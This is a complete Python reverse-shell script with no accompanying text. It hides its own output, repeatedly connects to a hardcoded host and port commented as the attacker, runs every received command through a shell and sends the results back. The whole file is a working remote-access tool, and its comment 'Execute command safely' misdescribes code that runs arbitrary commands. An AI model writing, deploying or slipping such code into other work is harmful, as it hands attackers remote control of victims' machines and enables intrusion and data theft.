#!/usr/bin/env python3
import socket
import subprocess
import time
import sys
import os

def reverse_shell(host="10.162.6.102", port=3399):
    # Suppress output
    devnull = open(os.devnull, 'w')
    sys.stdout = devnull
    sys.stderr = devnull
    
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            
            # Connect to attacker
            sock.connect((host, port))
            print(f"[+] Connected to {host}:{port}")
            
            while True:
                try:
                    # Set receive timeout
                    sock.settimeout(10)
                    
                    # Receive command with explicit size
                    cmd = b""
                    while True:
                        data = sock.recv(1024)
                        if not data:
                            break
                        cmd += data
                        if b"\n" in data:
                            break
                    
                    if not cmd:
                        break
                    
                    cmd = cmd.decode().strip()
                    print(f"[DEBUG] Received: {cmd}")
                    
                    # Execute command safely
                    try:
                        proc = subprocess.Popen(
                            cmd,
                            shell=True,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            text=True
                        )
                        output, error = proc.communicate(timeout=10)
                        
                        # Send combined output
                        result = output + error
                        sock.sendall(result.encode())
                        
                    except subprocess.TimeoutExpired:
                        sock.sendall(b"Command timed out")
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    sock.sendall(str(e).encode())
                    
        except socket.error as e:
            print(f"[-] Socket error: {e}")
            time.sleep(5)
        except Exception as e:
            print(f"[-] Unexpected error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    reverse_shell()
